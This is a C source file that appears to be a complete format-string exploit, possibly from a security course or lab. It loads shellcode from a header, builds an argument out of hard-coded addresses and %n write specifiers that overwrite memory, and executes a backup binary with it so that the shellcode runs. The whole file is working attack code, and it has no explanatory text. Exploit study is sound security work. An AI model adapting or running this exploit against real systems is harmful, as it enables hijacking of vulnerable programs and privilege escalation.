#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"
#define NTEST

#ifdef TEST
#define TARGET "/home/user/tester"
#else
#define TARGET "/usr/local/bin/backup" // or backupV2
#endif

#define L 190
int main(int argc, char* argv[])
{
	char *args[2];
	char *env[1];

	char name[L+1];
	int i;

	strcpy(name, shellcode);
	printf("%d\n", strlen(name));
	//strcpy(name + strlen(name), "\xbc\xdc\xbf\xff\xf0\xdb\xbf\xff__show:[%21$s]_should[\x52\x92\x04\x08]_before[%10$x]_change[%22$n]_result[%10$x]end");
	strcpy(name + strlen(name), "\xbc\xdc\xbf\xff\xbe\xdc\xbf\xff_[%56249u%21$n]_[%9157u%22$n]result[%21$s]end");
	for(i = strlen(name); i < L; ++i)
		name[i] = 'z';
	name[i] = '\0';

	args[0] = name;
	args[1] = NULL;

	env[0] = NULL;

	if (execve(TARGET, args, env) < 0)
		fprintf(stderr, "execve failed.\n");

	return 0;
}

